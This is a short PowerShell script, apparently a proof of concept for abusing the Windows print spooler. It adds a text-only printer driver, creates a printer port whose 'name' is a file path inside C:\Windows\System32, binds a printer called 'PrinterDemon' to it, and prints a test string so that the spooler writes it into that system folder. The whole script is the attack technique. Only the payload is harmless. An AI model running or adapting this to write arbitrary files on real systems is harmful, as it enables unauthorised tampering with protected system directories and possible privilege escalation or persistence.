$printerName = "PrinterDemon"
$driverName = "Generic / Text Only"
$portName = "c:\windows\system32\portDemon.txt"

$stringTest = "Th1s is 4 fr34k!ng t3st"

# add printer driver, which supports all ASCII characters and most
# characters of other character sets
echo "[] Adding printer driver -> $driverName <-"
Add-PrinterDriver -Name $driverName
echo "[+] Done"

# display printer drivers installed
#Get-PrinterDriver

# add printer port (to associate then to our printer)
echo "[] Adding printer port -> $portName <-"
Add-PrinterPort -Name $portName
echo "[+] Done"

# list printer ports installed in the machine
echo "[] Listing printer ports ..."
Get-PrinterPort

# create printer + bind it to driver and port just created
echo "[] Adding printer $printername and binding to previously created port+driver"
Add-Printer -name $printerName -DriverName $driverName -PortName $portName
echo "[+] Done"

# list printers installed in machine
#Get-Printer

echo "[] Writing to printer $printerName ..."
$stringTest | Out-Printer -name $printerName
echo "[+] DONE"
